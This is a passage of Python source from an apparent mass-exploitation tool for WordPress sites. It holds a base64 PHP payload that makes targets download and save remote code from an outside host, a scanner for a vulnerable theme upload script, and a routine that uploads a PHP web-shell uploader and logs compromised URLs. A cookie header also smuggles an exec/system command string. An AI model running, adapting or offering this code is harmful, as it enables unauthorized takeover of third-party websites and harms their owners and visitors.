            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
        }
        filename = 'ova' + ran(6) + ".php"
        content_filess = """PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ292YXRvb2xzLnBocCcsIGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwczovL3VjZG8uZ3JvdXAvd3AtYWRtaW4vdS50eHQnKSkgPyBwcmludCAnc3VjY2Vzc2Z1bGx5ICcgOiBwcmludCAnRXJyb3InOyA/Pg=="""
        check_url = f'{url}/admin.php?action=beindex&password=sem2023&aver={content_filess}&fileplus={content_filess}&checkstring={content_filess}'
        check = requests.get(check_url, verify=False, headers=headers)
        s = url + '/' + '/ovatools.php'
        shell = requests.get(s, verify=False, headers=headers)
        if 'Ova-Tools' in shell.text:
            print(' -| ' + url + ' --> {}[Succefully] [xploit]'.format(fg))
            open('results/ova.txt', 'a').write(s + '\n')
        else:
            print(' -| {:<50} --> {}[Failed]'.format(url, fr))
    except Exception as e:
        pass

def scanpathlanguage(site):
    url = 'http://' + code_shell.url_domain(site)
    try:
        for path in Language:
            check= requests.get(url + f"/wp-content/themes/{path}/include/lang_upload.php",headers=headers, allow_redirects=True, verify=False ,timeout=15).text
            if 'Please select Mo file' in check:
                vuln = url + f"/wp-content/themes/{path}/include/lang_upload.php"
                print(' -| {:<50} --> {}[Succesfully] [vuln]'.format(url, fg))
                xploitlanguage(vuln)
            else:
                print(' -| {:<50} --> {}[Failed]'.format(url, fr))
    except:
        pass
         
def upphp(site):
    try:
        url = "http://" + code_shell.url_domain(site) 
        check = requests.get(url + "/wp-content/plugins/fix/up.php", verify=False, timeout=15)
        if '<form action="" method="post"' in check.text:
            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'referer': 'http://www.google.com',
                'Cookie': 'GC=; ON=exec; T=; g=echo Sp3ctra; j=system; xL='
            }
            data = {"submit": "Upload Image"}
            shell = '''
			<?php
			echo "dandier uploader";
			$files = @$_FILES["files"];
			if ($files["name"] != '') {
			    $fullpath = $_REQUEST["path"] . $files["name"];
			    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
			        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
			    }
			}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
			?>'''
            files = {"fileToUpload": ("danploit.php", shell, "application/octet-stream")}
            response = requests.post(url + "/wp-content/plugins/fix/up.php", headers=headers, data=data, files=files, verify=False, timeout=15)
            xploit = requests.get(url + "/wp-content/plugins/fix/danploit.php", verify=False, timeout=15)
            if 'dandier uploader' in xploit.text:
                print(' -| {:<50} --> {}[Succesfully] [xploit]'.format(url, fg))
                open('results/exploit.txt', 'a').write(url + "/wp-content/plugins/fix/danploit.php\n")
            else:
                print(' -| {:<50} --> {}[Failed]'.format(url, fr))
        else:
            print(' -| {:<50} --> {}[Failed]'.format(url, fr))

    except Exception as e:
        pass

